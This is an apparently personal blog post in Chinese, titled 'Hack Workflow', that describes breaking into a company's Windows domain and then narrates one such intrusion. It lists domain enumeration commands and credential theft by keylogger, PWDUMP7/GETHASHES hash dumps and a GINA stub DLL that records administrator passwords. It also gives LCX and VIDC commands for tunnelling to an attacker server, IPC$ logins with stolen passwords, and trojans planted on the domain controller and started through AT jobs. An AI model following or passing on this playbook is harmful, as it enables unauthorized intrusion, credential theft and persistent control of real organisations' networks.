## Hack Workflow

渗透: 信息收集，然后分类归档，技术利用，从而达到目标。

1. 收集信息。

- 这台机器的所属人员，公司职位身份，有多大的权利， 这都关系到他在内网里的权限。

- 翻他的电脑这是必要的，一台个人用的电脑，从上面翻出与他自己相关的一些信息，和大量公司信息应该是没有问题的，除非，这是台新电脑。

- 期间你要记下你所掌握到的账号，密码这些重要数据，以后有一定的用，所以，在你渗透之前.记笔记.

2. 了解网络:
一般的内网，还是域?  必须了解他的网络拓扑，

我们只能了解我们所能知道的。不管他是INT，DMZ，LAN，我们必须足够掌握。在这，我们就会用到一定的命令，相信大家应该都很熟悉。
- ipconfig /all            IP段 网关 属于不属于域
- net view                 查询一些存在联系的机器，一般以机器名显示，我们需要对其PING出IP，一是方便查询哪些重要机器的IP，二是方便查询存在几个段
- net view /domain   查询有几个域 因为大型网络里面一般不止一个域的
- net group /domain 查询域里面的组
- net user /domain   查询域用户
- net group “domain admins” /domain 查询域管理用户组


3. 信息归档
2-1、有了信息，我们就要对信息进行一定的归档，将每个机器名所对应的IP归档，方便用时不会乱。
2-2、查询出的用户，管理员，我们也必须归档。
2-3、查询信息时可能出现的有利用价值信息必须归档。

3、技术利用
3-1、不论是通过键盘记录。或者HASH的抓取，我们需要将账号，密码，邮箱，凡是涉及关键数据的全部保存，一方面是准备渗透的资料，二是防止当前利用机器会掉。
3-1-1、利用远控的键盘记录进行抓取。
3-1-2、利用PWDUMP7或者GETHASHES进行抓取HASH，然后破解。GETHASHES V1。4后 可以抓取域的全部HASH。
3-1-3、用GINASTUB。DLL获取管理员的账号和密码。因为域管理员有权限登陆任何一台机器。种上这个只是方便记录他所登陆的密码。INSTALL后，会在SYSYTEM32下生成一个 FAXMODE。INC 文件记录密码。

3-2、有了内网，很多东西我们是没有必要直接在当前利用机器上操作的，别人虽然是内网，但是不代表他没有防御系统，所以，我们建立SOCKS或者VPN是很有必要的，建立SOCKS相信大家都会了吧。

3-2-1、我在这推荐 VIDC 这个工具，很方便，在CMD下直接操 VIDC。EXE -D -P PORT 就可以了。
3-2-2、在利用机器上使用LCX，CMD下 LCX。EXE -SLAVE 服务器IP PORT 127。0。0。1 PORT，然后到服务器上CMD下 LCX。EXE -LISTEN 服务器IP PORT 任意PORT。
3-2-3、建立SOCKS后在本地可以用SOCKSCAP来进行连接，成功连接后该操作什么就看你们自己了。
基本上我们就只能操作这么多了，后面已经没有什么技术上的再使用或利用，但是这中间的经验不少，所需要处理的细节也不少。
我们在得到内网机器后，如果他存在域，但是没有使用域账号怎么办?那我们只能查询或者想尽一切手段获得他常用的账号密码，然后利用这个账号密码，再通过SOCKS进入域。这其中就关系到各位 同行查看控制机器的文件，还有记录密码，GINA，HASH破解，这些都是必须的。

进入域后，我们又该怎么做，建立SOCKS后又该怎么做。我们可以扔S上去查看主要的端口，我们可以对端口进行弱口令的尝试，我们可以针对内网的WEB进行检测，方式很多，甚至你可以用MS08-067 对另一台机器进行突破，但是相信我，能使用域的机器，大部分都是补丁打齐的。我们能利用的很少，但是不能灰心，只要能在内网穿梭，我们至少在防御上会轻松很多，我们需要的只是耐心和时间。

一旦拥有密码，我们就可以尝试IPC连接，直接拿下域，这就得看你们的权限有多大。
net use \IPipc$ password /user:username@domain
推荐使用这样的方式输入账号和密码，为什么?如果用户名存在空格，你这样输会保险些。什么 域用户不能存在空格?
是的，以前我也认为不会，微软的讲师也说不会，不过，经过我的测试和经验，那是假的，域 完全可以空格，除了user name 这样的，还可以存在 user na me ，不信你可以试试。建立IPC后，你只是想COPY文件或者 RAR文件再或者种马 那就是你的自由了。
后话:最近因为在渗域，在渗透过程中，也确实出现一些问题，几次都是不知如何进行，其实在技术上，并没有什么障碍。主要是在于对方有着比较强的主防御，而我的远控最开始连CMD都无法执行， 后经过几天的环境测试，突破了CMD。有了CMD后，进行了查询，获得了一些信息，就开始了往下的渗透，被控机器的密码我不是跑出来的，我是翻他的文件翻出他常用密码的。因为他没有使用域账号， 都是以系统账号登陆，所以无法查看域。我只能用他的域账号建立IPC连接，查找到内网的一个WEB服务，将其渗透后才算拿下了一个稳定的内网机器。
拿下内网WEB服务器后，我就已经完全在域内，没有使用HASH INJECTION，我是先查询了DOMAIN ADMINS，发现WEB服务器上的账号就属于这个组，PW后得到了HASH，破解掉我就连向了域控服务器的 IPC$。
连接了IPC$，直接在其SYSYTEM32下扔了一个远控，然后用AT命令将其启动，这期间我尝试了5个SHIFT，但是SHIFT关闭后，我的远控也会掉，所以排除了这种方法，还是用AT来ADD NEW JOB 比较方便 。
给域控服务器种了远控，利用CMD来GETHASHES了全部的HASHES进行破解，很幸运的查到了文件管理组的用户，这才有了我后面的目标达成。
总的来说，我这次的渗透比较运气好，中间麻烦事不是太多，不过也花了半个月的时间，时间大部分花在测试防御环境，软件免杀，木马免杀，查找资料这些上面。
后来，我获取了他的网络拓补图，发现我所呆的区域只是一个小小的域，还有好几个域我还没有涉及到，在域的前面是DMZ，而DMZ前面当然是INT了。
已经很晚了，本来是在写一份详细的渗透过程，不过因为一直工作，很多细节没有办法当场记录，所以，暂时在BLOG上写一些能想到的，后面如果有时间有环境，会再补充更多的细节以及图片和在渗 透时所遇到的麻烦，如何解决等写出来。